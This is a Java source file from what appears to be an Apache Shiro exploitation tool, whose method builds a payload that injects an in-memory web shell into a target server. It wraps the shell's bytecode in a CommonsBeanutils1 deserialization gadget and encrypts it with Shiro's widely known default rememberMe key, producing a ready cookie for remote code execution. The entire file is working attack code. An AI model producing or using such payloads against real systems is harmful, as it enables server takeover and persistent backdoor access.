package com.y5neko.shiroexp.payloads;

import com.y5neko.shiroexp.gadget.CommonsBeanutils1;
import com.y5neko.shiroexp.misc.Tools;
import javassist.*;

import java.util.Base64;

public class InjectMemshell {
    public static void injectMemshell(String memshellType, String path, String password, String gadget) throws Exception {
        String[] gadgets = {"CommonsBeanutils1"};
        String[] memshellTypes = {"AntSwordFilter"};

        ClassPool pool = ClassPool.getDefault();
        CtClass memshellCtClass = pool.getCtClass("com.y5neko.shiroexp.memshell." + memshellType);
//        CtField pwdField = memshellCtClass.getField("Pwd");
//        CtField pathField = memshellCtClass.getField("path");
//        memshellCtClass.removeField(pwdField);
//        memshellCtClass.removeField(pathField);
//
//        memshellCtClass.addField(CtField.make("public String Pwd = \"" + password + "\";", memshellCtClass));
//        memshellCtClass.addField(CtField.make("public String path = \"" + path + "\";", memshellCtClass));


        byte[] memshellBytes = memshellCtClass.toBytecode();

        if (gadget.equals(gadgets[0])){
            CommonsBeanutils1 commonBeanutils1 = new CommonsBeanutils1();
            byte[] payload = commonBeanutils1.getPayload(memshellBytes);
            String data = Base64.getEncoder().encodeToString(payload);
            String result = Tools.CBC_Encrypt("kPH+bIxk5D2deZiIxcaaaA==", data);
            System.out.println(result);
        }
    }

    public static void main(String[] args) throws Exception {
        injectMemshell("GrateMemshell", "/test123", "test123", "CommonsBeanutils1");
    }
}
